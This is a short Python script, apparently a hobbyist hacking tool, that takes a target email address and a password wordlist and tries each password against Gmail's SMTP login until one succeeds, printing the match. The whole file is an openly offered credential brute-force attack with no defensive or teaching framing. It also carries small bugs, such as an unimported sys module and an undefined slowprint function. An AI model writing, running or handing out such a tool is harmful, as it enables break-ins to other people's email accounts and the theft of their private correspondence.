#!C:\Python35\python
#coding:utf-8

import os
import subprocess
import time
from datetime import datetime
from platform import platform
import smtplib


def os_system():
	if not 'Windows' in platform():
		slowprint('[*] This Versions Is For Windows, Windows platform is Required !!! sorry =( By Davistar')
		sys.exit()


def main():
	t = datetime.now()
	t1 = t.strftime('%H:%M:%S')
	os_system()
	print()
	print()
	username = str(input('\033[1;96m [\033[1;94m*\033[1;96m] Enter Target Email  ~> '))
	print()
	print('\033[1;96m [\033[1;94m*\033[1;96m] Target Email Selected ~> \033[1;94m'+username)
	print()
	passlist = str(input('\033[1;96m [\033[1;94m*\033[1;96m] Enter Wordlist ~> '))
	print()
	print('\033[1;96m [\033[1;94m*\033[1;96m] Wordlist Selected ~> \033[1;94m '+passlist)
	print()
	with open(passlist, 'r') as f:
		content = f.readlines()
		for password in content:
				t = datetime.now()
				t1 = t.strftime('%H:%M:%S')
				server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
				server.ehlo()
				password = password.rstrip()
				try:
					server.login(username, password)
					print('[$'+str('['+t1+']')+'] Password True !!! => ' +password);
					break;

				except smtplib.SMTPAuthenticationError:
					print('[$'+str('['+t1+']') +'] Try Password ~> ' +password)

main()
